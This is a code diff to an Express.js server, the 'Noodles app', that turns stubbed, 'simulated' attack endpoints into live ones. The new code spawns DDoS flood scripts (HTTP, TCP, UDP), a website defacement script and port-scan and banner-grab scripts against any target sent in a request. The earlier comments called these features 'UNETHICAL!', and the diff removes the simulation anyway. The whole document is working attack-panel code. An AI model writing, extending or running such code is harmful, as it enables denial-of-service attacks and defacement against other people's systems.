@@ -2,50 +2,150 @@ const express = require('express');
  const app = express();
  const port = 3000;
  const path = require('path');
+ const { spawn } = require('child_process');
  
 
  app.use(express.static('public'));
- app.use(express.json()); // Middleware to parse JSON bodies
+ app.use(express.json());
  
 
- // API endpoint for DDoS attacks
- app.post('/api/ddos', (req, res) => {
+ // Function to execute shell commands
+ function executeCommand(command, args) {
+  return new Promise((resolve, reject) => {
+  const process = spawn(command, args);
+  let result = '';
+ 
+
+  process.stdout.on('data', (data) => {
+  result += data.toString();
+  console.log(`stdout: ${data}`);
+  });
+ 
+
+  process.stderr.on('data', (data) => {
+  console.error(`stderr: ${data}`);
+  reject(data.toString());
+  });
+ 
+
+  process.on('close', (code) => {
+  if (code === 0) {
+  resolve(result);
+  } else {
+  reject(`Command failed with code ${code}`);
+  }
+  });
+ });
+ }
+ 
+
+ // DDoS attack endpoint
+ app.post('/api/ddos', async (req, res) => {
   const target = req.body.target;
   const type = req.body.type;
-  console.log(`DDoS attack requested: Target=${target}, Type=${type}`);
-  // TODO: Implement actual DDoS attack logic here (UNETHICAL!)
-  res.send({ status: 'DDoS attack initiated (simulated)' });
+  const duration = req.body.duration || 60; // Default duration: 60 seconds
+  console.log(`DDoS attack requested: Target=${target}, Type=${type}, Duration=${duration}`);
+ 
+
+  try {
+  let scriptPath;
+  let args;
+ 
+
+  switch (type) {
+  case 'http':
+  scriptPath = path.join(__dirname, 'ddos', 'http_flood.js');
+  args = [target, duration];
+  break;
+  case 'tcp':
+  scriptPath = path.join(__dirname, 'ddos', 'tcp_flood.js');
+  args = [target, duration];
+  break;
+  case 'udp':
+  scriptPath = path.join(__dirname, 'ddos', 'udp_flood.js');
+  args = [target, duration];
+  break;
+  default:
+  return res.status(400).send({ status: 'Invalid DDoS attack type' });
+  }
+ 
+
+  // Execute the DDoS attack script
+  await executeCommand('node', [scriptPath, ...args]);
+  res.send({ status: `DDoS attack initiated (${type}) on ${target} for ${duration} seconds` });
+  } catch (error) {
+  console.error(`DDoS attack failed: ${error}`);
+  res.status(500).send({ status: `DDoS attack failed: ${error}` });
+  }
  });
  
 
- // API endpoint for defacement
- app.post('/api/defacement', (req, res) => {
+ // Defacement endpoint
+ app.post('/api/defacement', async (req, res) => {
   const target = req.body.target;
   const action = req.body.action;
+  const content = req.body.content;
   console.log(`Defacement requested: Target=${target}, Action=${action}`);
-  // TODO: Implement actual defacement logic here (UNETHICAL!)
-  res.send({ status: 'Defacement initiated (simulated)' });
+ 
+
+  try {
+  const scriptPath = path.join(__dirname, 'defacement', 'deface.js');
+  const args = [target, action, content];
+ 
+
+  // Execute the defacement script
+  await executeCommand('node', [scriptPath, ...args]);
+  res.send({ status: `Defacement initiated (${action}) on ${target}` });
+  } catch (error) {
+  console.error(`Defacement failed: ${error}`);
+  res.status(500).send({ status: `Defacement failed: ${error}` });
+  }
  });
  
 
-  // API endpoint for connections
- app.post('/api/connection', (req, res) => {
+ // Connection endpoint
+ app.post('/api/connection', async (req, res) => {
   const target = req.body.target;
   const type = req.body.type;
   console.log(`Connection requested: Target=${target}, Type=${type}`);
-  // TODO: Implement actual connection logic here (UNETHICAL!)
-  res.send({ status: 'Connection initiated (simulated)' });
+ 
+
+  try {
+  let scriptPath;
+  let args;
+ 
+
+  switch (type) {
+  case 'portscan':
+  scriptPath = path.join(__dirname, 'connection', 'port_scan.js');
+  args = [target];
+  break;
+  case 'bannergrab':
+  scriptPath = path.join(__dirname, 'connection', 'banner_grab.js');
+  args = [target];
+  break;
+  default:
+  return res.status(400).send({ status: 'Invalid connection type' });
+  }
+ 
+
+  // Execute the connection script
+  await executeCommand('node', [scriptPath, ...args]);
+  res.send({ status: `Connection initiated (${type}) on ${target}` });
+  } catch (error) {
+  console.error(`Connection failed: ${error}`);
+  res.status(500).send({ status: `Connection failed: ${error}` });
+  }
  });
  
 
- //About Us page
+ // About Us page
  app.get('/about', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'about.html'));
  });
  
 
- 
-
+ // Start server
  app.listen(port, () => {
   console.log(`Noodles app listening on port ${port}`);
  });
